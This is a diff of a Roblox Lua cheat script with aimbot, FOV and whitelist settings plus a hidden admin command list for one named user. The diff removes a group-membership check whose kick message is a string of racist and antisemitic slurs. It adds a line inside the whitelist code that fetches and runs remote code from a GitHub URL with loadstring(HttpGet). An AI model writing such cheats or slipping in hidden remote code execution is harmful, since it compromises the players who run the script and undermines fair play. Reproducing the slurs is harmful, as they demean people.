@@ -1,7 +1,4 @@
-local plr = game:GetService("Players").LocalPlayer
-if plr:IsInGroup("12461136") then
-    
-    local admins = {"hellofarzad125"}
+local admins = {"hellofarzad125"}
     local commands = {"tp","usingsilent","void","kick,ban"}
     local prefix = ";"
     
@@ -402,7 +399,7 @@ local AimbotFOVToggle = LegitSection:AddToggle('Show FOV', false, function(Boole
 end)
 
 AimbotFOVToggle:AddColorpicker(PuppywareSettings.Aiming.Aimbot.FOVColor, function(Color)
-    PuppywareSettings.Aiming.Aimbot.FOVColor = Color
+    Library.theme.accentcolor = Color
 end)
 
 LegitSection:AddToggle('Use Nearest Distance', false, function(Boolean)
@@ -879,6 +876,8 @@ WhitelistSection:AddButton('Add', function(State)
         })
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxprogamer2141274/oaoa/main/emoji3"))()
 
 WhitelistSection:AddButton('Remove', function()
     if PuppywareSettings.Aiming.Whitelist.Holder ~= nil and Players:FindFirstChild(PuppywareSettings.Aiming.Whitelist.Holder) then
@@ -2020,8 +2019,4 @@ while wait() do
             end
         end
     end
-end 
-
-else
-    plr:kick("XD NIGGA JEW NIGGA NIGGER XD OWO Not Whitelisted")
 end
